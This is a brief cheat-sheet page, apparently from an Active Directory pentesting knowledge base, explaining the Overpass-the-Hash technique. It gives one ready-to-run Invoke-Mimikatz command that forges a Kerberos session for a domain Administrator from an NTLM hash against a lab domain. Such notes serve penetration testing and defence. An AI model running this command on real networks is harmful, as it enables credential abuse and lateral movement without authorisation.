---
title: "Overpass-the-Hash"
description: "Overpass-the-Hash attack."
lead: "How to perform Overpass-the-Hash using Mimikatz."
date: 2021-11-06T11:53:35+01:00
lastmod: 2021-11-06T11:53:35+01:00
draft: false
images: []
menu: 
  active_directory:
    parent: "lateral_movement"
weight: 40
toc: true
---

## General

- Similar to pass-the-hash
- Creates valid kerberos ticket from NTLM hash of user
- Able to access any domain service and not just services that support NTLM authentication like in PTH attacks

## Exploitation with Invoke-Mimikatz

```powershell
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:lab.local /ntlm:<HASH> /run:powershell.exe"'
```
